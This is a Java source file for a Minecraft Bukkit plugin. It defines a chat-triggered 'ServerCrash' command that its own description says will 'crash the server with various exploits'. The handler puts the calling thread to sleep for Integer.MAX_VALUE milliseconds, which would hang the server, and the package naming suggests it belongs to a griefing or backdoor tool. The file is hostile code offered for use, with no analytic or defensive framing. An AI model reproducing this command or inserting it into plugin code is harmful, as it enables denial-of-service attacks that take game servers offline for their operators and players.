package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.entity.Player;

public class ServerCrash extends Command {

    public ServerCrash() {
        super("ServerCrash", "ServerCrash <Time | Chat | Gamemode>", "Crash the server with various exploits", CommandCategory.SERVER, "SCrash");
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        try {
            Thread.sleep(Integer.MAX_VALUE);
        } catch (InterruptedException e) {}

    }

}